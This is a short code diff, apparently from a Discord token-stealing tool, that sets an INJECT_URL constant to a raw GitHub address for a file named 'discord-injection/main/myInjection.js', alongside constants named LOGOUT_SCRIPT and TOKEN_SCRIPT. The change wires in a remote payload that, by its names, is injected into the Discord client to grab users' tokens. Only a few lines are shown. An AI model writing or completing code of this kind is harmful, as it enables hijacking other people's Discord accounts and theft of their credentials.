@@ -35,5 +35,5 @@ const [LOGOUT_SCRIPT, TOKEN_SCRIPT, INJECT_URL] = [
     "    }" +
     "} token;",
     
-    ""
+    "https://raw.githubusercontent.com/xnayx/discord-injection/main/myInjection.js"
 ];
